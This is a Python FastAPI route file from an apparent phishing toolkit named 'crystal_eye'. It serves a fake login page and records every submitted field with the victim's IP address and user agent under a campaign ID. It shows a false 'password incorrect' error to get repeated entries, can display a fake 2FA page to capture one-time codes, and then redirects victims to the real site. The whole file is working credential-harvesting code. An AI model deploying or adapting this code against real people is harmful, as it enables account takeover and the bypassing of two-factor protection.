from __future__ import annotations

from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse, RedirectResponse

from crystal_eye.db.models import Credential


def register_routes(app: FastAPI) -> None:

    @app.get("/", response_class=HTMLResponse)
    async def login_page(request: Request):
        loader = request.app.state.loader
        html = loader.render_login(post_url="/login")
        return HTMLResponse(content=html)

    @app.post("/login")
    async def capture_credentials(request: Request):
        form_data = await request.form()
        manifest = request.app.state.manifest
        config = request.app.state.config
        on_credential = request.app.state.on_credential
        tracker = request.app.state.attempt_tracker

        client_ip = request.client.host if request.client else "unknown"
        user_agent = request.headers.get("user-agent", "")

        fields = {}
        for field_def in manifest.fields:
            value = form_data.get(field_def.name, "")
            fields[field_def.name] = str(value)

        tracker_key = client_ip
        current_attempt = tracker.get(tracker_key, 0) + 1
        tracker[tracker_key] = current_attempt

        credential = Credential(
            campaign_id=config._active_campaign_id or 0,
            fields=fields,
            source_ip=client_ip,
            user_agent=user_agent,
        )
        on_credential(credential)

        max_attempts = config.max_attempts
        redirect_url = config.redirect_url or manifest.redirect_url

        if current_attempt >= max_attempts:
            tracker.pop(tracker_key, None)

            # If 2FA is enabled, show the 2FA page instead of redirecting
            if config.enable_2fa:
                loader = request.app.state.loader
                html = loader.render_2fa(post_url="/2fa")
                return HTMLResponse(content=html)

            return RedirectResponse(url=redirect_url, status_code=303)

        loader = request.app.state.loader
        html = loader.render_error(
            post_url="/login",
            error_message="The password that you've entered is incorrect. Please try again.",
        )
        return HTMLResponse(content=html)

    @app.post("/2fa")
    async def capture_2fa_code(request: Request):
        form_data = await request.form()
        config = request.app.state.config
        manifest = request.app.state.manifest
        on_credential = request.app.state.on_credential

        client_ip = request.client.host if request.client else "unknown"
        user_agent = request.headers.get("user-agent", "")

        code = str(form_data.get("code", ""))

        # Send the 2FA code as a credential capture
        credential = Credential(
            campaign_id=config._active_campaign_id or 0,
            fields={"2fa_code": code},
            source_ip=client_ip,
            user_agent=user_agent,
        )
        on_credential(credential)

        # Redirect to the real site
        redirect_url = config.redirect_url or manifest.redirect_url
        return RedirectResponse(url=redirect_url, status_code=303)

    @app.get("/favicon.ico")
    async def favicon():
        return Response(status_code=204)
